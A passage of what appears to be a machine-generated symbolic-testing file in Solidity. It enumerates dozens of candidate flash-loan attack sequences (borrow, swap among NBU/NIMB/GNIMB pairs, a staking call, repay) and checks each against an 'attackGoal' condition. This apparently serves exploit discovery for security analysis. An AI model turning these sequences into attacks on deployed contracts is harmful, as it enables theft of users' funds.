        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3561(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3562(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3563(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3564(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3565(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3566(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3567(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3568(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3569(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3570(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3571(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3572(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3573(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3574(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3575(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3576(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3577(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3578(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3579(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3580(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3581(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3582(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3583(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3584(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3585(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3586(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3587(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3588(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3589(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3590(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3591(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3592(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3593(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3594(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3595(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3596(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3597(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3598(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3599(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3600(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3601(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3602(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3603(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3604(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3605(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3606(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
